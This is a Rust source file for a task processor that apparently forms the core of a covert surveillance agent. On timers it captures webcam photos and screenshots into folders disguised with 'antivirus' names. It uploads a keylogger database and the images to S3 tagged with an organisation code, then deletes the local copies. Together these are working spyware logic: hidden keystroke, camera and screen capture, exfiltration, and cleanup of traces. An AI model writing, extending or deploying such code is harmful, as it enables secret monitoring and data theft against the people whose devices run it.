// src/tasks/processor.rs
use std::error::Error;
use std::time::{Duration, Instant};
use std::path::PathBuf;
use log::{error, info, debug};
use crate::config::ConfigAws;
use crate::s3upload::S3Uploader;
use crate::img::imgutil::SecureFolder;
use crate::cam::capcamadv::capturecam;
use crate::orgdetails::orgdetails::get_org_details;
use crate::screen::screenshotadv;

pub struct TaskProcessor {
    base_path: PathBuf,
    s3_uploader: S3Uploader,
    last_screenshot_time: Instant,
    last_camerashot_time: Instant,
    last_upload_time: Instant,
}

impl TaskProcessor {
    pub async fn new(s3_uploader: S3Uploader) -> Result<Self, Box<dyn Error>> {
        let base_path = PathBuf::from("./secure_data");
        if !base_path.exists() {
            std::fs::create_dir_all(&base_path)?;
            info!("Created base directory for secure storage");
        }

        Ok(Self {
            base_path,
            s3_uploader,
            last_screenshot_time: Instant::now(),
            last_camerashot_time: Instant::now(),
            last_upload_time: Instant::now(),
        })
    }

    pub async fn process_tasks(&mut self, config: &ConfigAws) -> Result<(), Box<dyn Error>> {
        info!("Processing tasks - Camera Capture");
        if let Err(e) = self.process_camera_capture(config) {
            error!("Error processing camera capture: {}", e);
        }

        info!("Processing tasks - Screen Capture");
        if let Err(e) = self.process_screenshot_capture(config) {
            error!("Error processing screenshot capture: {}", e);
        }

        info!("Processing tasks - Upload Capture");
        if let Err(e) = self.process_uploads(config).await {
            error!("Error processing uploads: {}", e);
        }

        Ok(())
    }

    fn process_camera_capture(&mut self, config: &ConfigAws) -> Result<(), Box<dyn Error>> {
        let camshot_interval = Duration::from_secs(config.settings.cameracaptureduration * 60);

        debug!("Camera Capture Interval: {} seconds", camshot_interval.as_secs());
        debug!("Time since last camera capture: {} seconds", self.last_camerashot_time.elapsed().as_secs());

        if self.last_camerashot_time.elapsed() >= camshot_interval {
            info!("Initiating camera capture...");
            let secure_folder_cc = SecureFolder::new(self.base_path.clone(), "cc_antivirus")?;

            if let Err(e) = capturecam(&secure_folder_cc) {
                error!("Camera capture failed: {}", e);
            } else {
                info!("Camera capture completed successfully.");
            }

            self.last_camerashot_time = Instant::now();
        } else {
            debug!("Skipping camera capture. Interval not reached.");
        }

        Ok(())
    }

    fn process_screenshot_capture(&mut self, config: &ConfigAws) -> Result<(), Box<dyn Error>> {
        let screenshot_interval = Duration::from_secs(config.settings.screenshotduration * 60);

        debug!("Screenshot Capture Interval: {} seconds", screenshot_interval.as_secs());
        debug!("Time since last screenshot capture: {} seconds", self.last_screenshot_time.elapsed().as_secs());

        if self.last_screenshot_time.elapsed() >= screenshot_interval {
            info!("Initiating screenshot capture...");
            let secure_folder_sc = SecureFolder::new(self.base_path.clone(), "sc_antivirus")?;

            if let Err(e) = screenshotadv::capture_screenshot(&secure_folder_sc) {
                error!("Screenshot capture failed: {}", e);
            } else {
                info!("Screenshot capture completed successfully.");
            }

            self.last_screenshot_time = Instant::now();
        } else {
            debug!("Skipping screenshot capture. Interval not reached.");
        }
        Ok(())
    }
    async fn process_uploads(&mut self, config: &ConfigAws) -> Result<(), Box<dyn Error>> {
        let upload_interval = Duration::from_secs(config.settings.uploadduration * 60);

        if self.last_upload_time.elapsed() >= upload_interval {
            info!("Starting upload process for account: {}", get_org_details().get_org_code());

            self.upload_keylogger_data().await?;
            self.upload_images().await?;
            //self.cleanup_after_upload()?;

            self.last_upload_time = Instant::now();
        }
        Ok(())
    }

    async fn upload_keylogger_data(&self) -> Result<(), Box<dyn Error>> {
        if let Err(e) = self.s3_uploader.process_sqlite_data("keylogger.db").await {
            error!("SQLite data upload failed: {}", e);
            return Err(Box::new(std::io::Error::new(
                std::io::ErrorKind::Other,
                format!("Failed to upload keylogger data: {}", e)
            )));
        }
        Ok(())
    }

    async fn upload_images(&self) -> Result<(), Box<dyn Error>> {
        let screenshot_secure_folder = self.create_secure_folder("sc_antivirus")?;
        let camera_secure_folder = self.create_secure_folder("cc_antivirus")?;

        let (temp_paths, file_lists) = self.prepare_temp_directories(
            &screenshot_secure_folder,
            &camera_secure_folder
        )?;

        self.s3_uploader.process_images(
            &temp_paths.screenshot_path.as_os_str().to_str().unwrap(),
            &temp_paths.camera_path.as_os_str().to_str().unwrap()
        ).await?;

        self.cleanup_temp_directories(&temp_paths)?;
        self.cleanup_original_files(&screenshot_secure_folder, &camera_secure_folder, &file_lists)?;

        Ok(())
    }

    fn create_secure_folder(&self, folder_name: &str) -> Result<SecureFolder, Box<dyn Error>> {
        SecureFolder::new(self.base_path.clone(), folder_name)
            .map_err(|e| {
                error!("{} secure folder initialization failed: {}", folder_name, e);
                Box::new(std::io::Error::new(
                    std::io::ErrorKind::Other,
                    format!("Failed to initialize {} secure folder: {}", folder_name, e)
                )) as Box<dyn Error>
            })
    }

    fn prepare_temp_directories(
        &self,
        screenshot_folder: &SecureFolder,
        camera_folder: &SecureFolder
    ) -> Result<(TempPaths, FileList), Box<dyn Error>> {
        let temp_dir = std::env::temp_dir();
        let temp_paths = TempPaths {
            screenshot_path: temp_dir.join("temp_screenshots"),
            camera_path: temp_dir.join("temp_camera"),
        };

        std::fs::create_dir_all(&temp_paths.screenshot_path)?;
        std::fs::create_dir_all(&temp_paths.camera_path)?;

        let screenshot_files = self.process_folder_files(
            screenshot_folder,
            &temp_paths.screenshot_path,
            ".png"
        )?;

        let camera_files = self.process_folder_files(
            camera_folder,
            &temp_paths.camera_path,
            ".png"
        )?;

        Ok((temp_paths, FileList {
            screenshot_files,
            camera_files,
        }))
    }

    fn process_folder_files(
        &self,
        secure_folder: &SecureFolder,
        temp_path: &PathBuf,
        extension: &str
    ) -> Result<Vec<String>, Box<dyn Error>> {
        let mut processed_files = Vec::new();

        for entry in secure_folder.path.read_dir()? {
            if let Ok(entry) = entry {
                let filename = entry.file_name();
                let filename_str = filename.to_string_lossy().to_string();
                if filename_str.ends_with(extension) {
                    if let Ok(decrypted_data) = secure_folder.read_file(&filename_str) {
                        let temp_file_path = temp_path.join(&filename);
                        std::fs::write(&temp_file_path, &decrypted_data)?;
                        processed_files.push(filename_str);
                    }
                }
            }
        }

        Ok(processed_files)
    }

    fn cleanup_temp_directories(&self, temp_paths: &TempPaths) -> Result<(), Box<dyn Error>> {
        std::fs::remove_dir_all(&temp_paths.screenshot_path)?;
        std::fs::remove_dir_all(&temp_paths.camera_path)?;
        Ok(())
    }

    fn cleanup_original_files(
        &self,
        screenshot_folder: &SecureFolder,
        camera_folder: &SecureFolder,
        file_lists: &FileList
    ) -> Result<(), Box<dyn Error>> {
        for filename in &file_lists.screenshot_files {
            if let Err(e) = std::fs::remove_file(screenshot_folder.path.join(filename)) {
                error!("Failed to remove screenshot file {}: {}", filename, e);
            }
        }

        for filename in &file_lists.camera_files {
            if let Err(e) = std::fs::remove_file(camera_folder.path.join(filename)) {
                error!("Failed to remove camera file {}: {}", filename, e);
            }
        }

        Ok(())
    }
}

struct TempPaths {
    screenshot_path: PathBuf,
    camera_path: PathBuf,
}

struct FileList {
    screenshot_files: Vec<String>,
    camera_files: Vec<String>,
}